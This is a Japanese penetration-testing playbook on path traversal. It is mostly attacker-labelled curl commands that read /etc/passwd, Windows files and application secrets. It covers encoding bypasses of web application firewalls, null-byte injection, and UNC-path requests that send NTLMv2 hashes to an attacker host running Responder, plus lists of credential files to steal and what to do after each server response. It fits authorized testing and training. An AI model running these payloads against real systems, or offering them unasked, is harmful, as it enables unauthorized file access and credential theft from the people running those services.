# パストラバーサル（ディレクトリトラバーサル）

> **スコープ**: Web アプリのファイルパス操作不備による Web ルート外ファイル読取。基本試行〜バイパスエンコード〜null byte injection〜Windows UNC パス（NTLM steal）〜アプリ固有 CVE ペイロードまで扱う。取得した認証情報の処理は `../Credential_Discovery.md`、ハッシュクラックは `../../05_Tools_Reference/Hashcat.md` を参照。

## 着火条件

- Web サービスが動いており、バージョンが特定できた
- そのバージョンにパストラバーサルの CVE が存在する（searchsploit / NVD で確認）
- ファイルダウンロード・プラグイン読み込み・画像表示など、パスを受け取るエンドポイントがある
- **CVE が無くても着火する**: 自作スクリプト・カスタム実装での `fopen($_GET['file'])` 系、nginx alias 設定不備（`/static../` が許される typo 等）、CGI / レガシーフレームワークの独自パス解決でも traversal は発生する。CVE 検索でヒットしない場合も「パスを受け取るエンドポイント」全てに対して機械的に `../` を試す価値あり

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用 Linux ディストリ標準搭載）/ `searchsploit`（同左）/ `responder`（UNC パス経由 NTLM steal 時、標準搭載・要 root）
- インターネットアクセス: NVD / GitHub での CVE 詳細確認時に必要。`searchsploit` 自体はオフラインで動作（事前に `searchsploit -u` で DB 更新）

## 先に確認すること

バージョンが判明した段階で**即座に CVE を検索する習慣**をつける。有名 OSS ダッシュボード・監視ツール（Grafana / Kibana / Splunk 等）はバージョン依存の既知脆弱性が多い。

**パストラバーサルが刺さる場合に最初に確認すべきファイル:**

| 確認対象 | パス | 目的 / 注意 |
|---------|------|------|
| OS ユーザー情報 | `/etc/passwd` | ユーザー名・シェルの確認（mode 644 で全ユーザー読取可）|
| ホスト情報 | `/etc/hosts` | Docker コンテナかどうかの確認（ランダム 16 進ホスト名 → コンテナ内）|
| OS バージョン | `/etc/os-release` | 環境把握 |
| プロセス実情報 | `/proc/self/environ` / `/proc/self/cmdline` / `/proc/self/cwd` | 環境変数（DB 接続文字列が入っていることが多い）・プロセス cwd |
| **`/etc/shadow`**（ハッシュ）| `/etc/shadow` | **一般ユーザー権限の Web プロセス（`www-data`/`nginx`/`apache` 等）では読めない**のが共通点。LFI が root 権限プロセスに刺さった場合のみ取得可。読めなかった事実が「Web プロセスは非 root」のシグナル |
| Windows 基本 | `C:\Windows\win.ini` / `C:\Windows\System32\drivers\etc\hosts` | Windows ホストでの動作確認 |
| アプリ設定ファイル | アプリ依存（下表）| 認証情報・シークレット |

**アプリケーション別の重要ファイルパス:**

| アプリ | データベース / 設定ファイル |
|-------|--------------------------|
| Grafana | `/var/lib/grafana/grafana.db`（SQLite）/ `/etc/grafana/grafana.ini` |
| WordPress | `/var/www/html/wp-config.php` |
| Tomcat | `/opt/tomcat/conf/tomcat-users.xml` / `WEB-INF/web.xml` / `webapps/manager/WEB-INF/web.xml` |
| Java Web app（汎用）| `WEB-INF/web.xml`（サーブレットマッピング）/ `WEB-INF/classes/application.properties` / `WEB-INF/classes/log4j2.xml`（JNDI sink の手がかり）|
| Jenkins | `/var/jenkins_home/secrets/initialAdminPassword` / `/var/jenkins_home/credentials.xml` |
| GitLab | `/etc/gitlab/gitlab.rb` / `/var/opt/gitlab/gitlab-rails/etc/secrets.yml` |
| Windows IIS | `C:\inetpub\wwwroot\web.config` / `C:\Windows\System32\inetsrv\config\applicationHost.config` |
| Generic Linux | `/etc/passwd` / `~/.ssh/id_rsa` / `~/.bash_history` / `/proc/self/environ` |

**攻撃者の思考トレース:** バージョンが取れたら CVE 検索が最短経路になる。CVE がなくても「パスを受け取るエンドポイント全て」に機械的に試す。まず `--path-as-is` で `../` を試して応答を見る → 失敗したらエンコードバリアントを順に試す。

---

## 1. 基本的なパストラバーサル試行

**コマンド:**

```bash
# [Attacker] Linux 系 — シンプルなトラバーサル（必ず --path-as-is を付ける）
curl -v --path-as-is "http://[TARGET]/[ENDPOINT]/../../../etc/passwd"

# [Attacker] URL エンコード（WAF がある場合）
curl -v "http://[TARGET]/[ENDPOINT]/..%2F..%2F..%2Fetc%2Fpasswd"

# [Attacker] ダブルエンコード
curl -v "http://[TARGET]/[ENDPOINT]/..%252F..%252F..%252Fetc%252Fpasswd"

# [Attacker] Windows 系
curl -v --path-as-is "http://[TARGET]/[ENDPOINT]/../../../windows/win.ini"
curl -v --path-as-is "http://[TARGET]/[ENDPOINT]/..\..\..\windows\win.ini"   # バックスラッシュ版
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/etc/passwd` の内容（`root:x:0:0...`）| traversal 成立 | 「最初に確認すべきファイル」の順で展開 → `../Credential_Discovery.md` |
| 400 / 403 | サニタイズ有り または WAF 単純パターン検知 | エンコードバリアント（§2）を試す |
| `../` が消えた状態で 200 | curl が `../` を正規化 | `--path-as-is` を必ず付けて再試行 |
| ファイルは読めるが内容が空 | Web アプリの cwd が想定と違う | `/proc/self/cwd` / `/proc/self/environ` で実際のパスを特定 |

**注意:** `--path-as-is` を付けないと curl が `../` を正規化してしまう。これを忘れてエンコードなしで失敗するケースが多い。

---

## 2. バイパスエンコードバリアント

**コマンド（ENTITY 行のバリエーション例）:**

```bash
# [Attacker] エンコード各種
# %2F = /
curl -v "http://[TARGET]/[ENDPOINT]/..%2F..%2F..%2Fetc%2Fpasswd"
# ダブルエンコード %252F = %2F → デコード後 /
curl -v "http://[TARGET]/[ENDPOINT]/..%252F..%252F..%252Fetc%252Fpasswd"
# Unicode エスケープ（一部の IIS / .NET）
curl -v "http://[TARGET]/[ENDPOINT]/..%c0%af..%c0%afetc%c0%afpasswd"
# バックスラッシュ混在（Windows / 一部の Java）
curl -v "http://[TARGET]/[ENDPOINT]/..\/..\/etc\/passwd"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| エンコードバリアントで traversal 成立 | WAF が特定のエンコードを見落としている | そのエンコードで重要ファイルを順次取得 |
| 全バリアントで 400 / 403 | WAF がデコード後の内容を検査 | §4 アプリ固有 CVE ペイロードへ |

---

## 3. Null byte injection（古典手法）

**コマンド:**

```bash
# [Attacker] %00 で拡張子チェックを破る古典手法
curl -v "http://[TARGET]/[ENDPOINT]?file=../../../etc/passwd%00.jpg"
# → アプリが「拡張子が .jpg で終わるか」だけ検証 + C 系 native 層が %00 で文字列終端と解釈する実装でのみ通る
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| traversal 成立 | PHP 5.3.4 未満 / Java 7 未満 / 古い C 拡張系 | 重要ファイルを順次取得 |
| 400 / 拒否 | 現代環境（修正済み）| 他バリアントへ |

**注意:** PHP 5.3.4 以降は `%00` を含むファイル名を拒否（CVE-2006-7243 系対応）。Java も JDK 7u40 / JDK 8 以降で `InvalidPathException` を投げる。「古いシステム向けの一手」と認識する。

---

## 4. Windows 環境 + Java / .NET での UNC パスによる NTLM steal

ファイル読み込み関数が UNC パス（`\\[ATTACKER_HOST]\share`）を受け入れる Java / .NET / 一部の Windows アプリでは、攻撃者の SMB サーバへの接続を強制でき、**NTLMv2 ハッシュを steal** できる。

**事前準備（必須）:**

```bash
# [Attacker] Responder で NTLMv2 ハッシュを listen（要 root、ペネトレ用 Linux ディストリ標準）
sudo responder -I [ATTACKER_IFACE]
```

**コマンド:**

```bash
# [Attacker] ターゲットに UNC パスを送る
curl -v "http://[TARGET]/[ENDPOINT]?file=\\\\[ATTACKER_IP]\\share\\test"
curl -v "http://[TARGET]/[ENDPOINT]?file=//[ATTACKER_IP]/share/test"   # スラッシュ版
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Responder に NTLMv2 ハッシュが届く | UNC パスを経由した NTLMv2 steal 成立 | hashcat mode 5600 でクラック → `../../05_Tools_Reference/Hashcat.md`。または NTLM Relay → `../../04_Post_Access_Windows_AD/NTLM_Relay/Responder.md` |
| 接続が来ない | Java / .NET が UNC パスを拒否 | §1〜§3 の Linux パス読取へ |

---

## 5. アプリ固有 CVE ペイロード

バージョン特定後に、該当する CVE の具体的なペイロード（プラグイン経由の `../` パス、データベース取得手順等）が必要な場合は `../../05_Tools_Reference/CVE_Notes.md` を参照する。

**コマンド（CVE 検索）:**

```bash
# [Attacker] バージョンから CVE を検索
searchsploit grafana 8.0
searchsploit CVE-2021-43798
# → 詳細ペイロード: ../../05_Tools_Reference/CVE_Notes.md（Grafana 8.0.0〜8.3.0 CVE-2021-43798 等）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| searchsploit で CVE ヒット | 既知ペイロードが使える | `CVE_Notes.md` でペイロードを確認して実行 |
| `/etc/passwd` は取れないが DB ファイルは取れる | Grafana 等のプラグインパス限定の traversal | `grafana.db` 取得 → SQLite でユーザーハッシュを抽出 |
| Docker コンテナ内で `/etc/hosts` がランダム 16 進ホスト名 | コンテナ内に閉じている | ホスト側ファイルは諦め、コンテナ内のアプリ設定 DB（Grafana 等）を次の獲物にする |

---

## 刺さらなかったとき（全体）

| 症状 | 推定原因 | 次のアクション |
|------|----------|--------------|
| `../` をエンコードなしで送って 400 / 403 | サニタイズあり / WAF 単純パターン検知 | `%2F` / `%252F` / `..%c0%af` 等のエンコードバリアント（§2）|
| `--path-as-is` なしで 200 が返るが `../` が消えている | curl が `../` を正規化 | `curl --path-as-is` を必ず付ける |
| ファイルは読めるが内容が空 | アプリの cwd が想定と違う | `curl .../proc/self/cwd` / `curl .../proc/self/environ` で実際のパスを特定 |
| 全ての `/etc/passwd` 取得試行が 404 | パス制限（特定ディレクトリ配下のみアクセス可）| アプリ固有 CVE のペイロード（§5、プラグイン経由パス等）を試す |
| Docker コンテナ内 | コンテナ内に閉じている | ホスト側ファイルは不可。コンテナ内アプリ設定 DB が次の獲物 |

---

## 注意点・落とし穴

- `--path-as-is` を付けないと `curl` が `../` を正規化してしまう（最頻出の失敗）
- WAF が `../` を検出する場合はエンコード（`%2F` / `%252F`）を試みる
- Docker コンテナ内でのパストラバーサルはコンテナ内のファイルしか読めない
- `/etc/shadow` は一般ユーザー権限の Web プロセスでは読めないのが普通。「読めなかった」こと自体が情報

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 関連技術
- 前：バージョン確認・CVE 検索 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：searchsploit でのエクスプロイト検索 → `../../05_Tools_Reference/Searchsploit.md`
- 関連：アプリ × バージョン固有のペイロード集 → `../../05_Tools_Reference/CVE_Notes.md`
- 後：取得した DB / 設定ファイルからの認証情報抽出 → `../Credential_Discovery.md`
- 後：Grafana ハッシュのクラック（PBKDF2-HMAC-SHA256）→ `../../05_Tools_Reference/Hashcat.md`
- 後（UNC パス NTLMv2 steal 成立時）：NTLM Relay / クラック → `../../04_Post_Access_Windows_AD/NTLM_Relay/Responder.md` / `../../05_Tools_Reference/Hashcat.md`（mode 5600）
- 関連：「URL を入力してファイルを取得する」系の脆弱性（SSRF と表裏）→ `SSRF.md`
- 後（読めたファイルが PHP として実行された＝ include sink だった場合）：wrapper / log poisoning / filter chain による RCE 昇格 → `LFI.md`
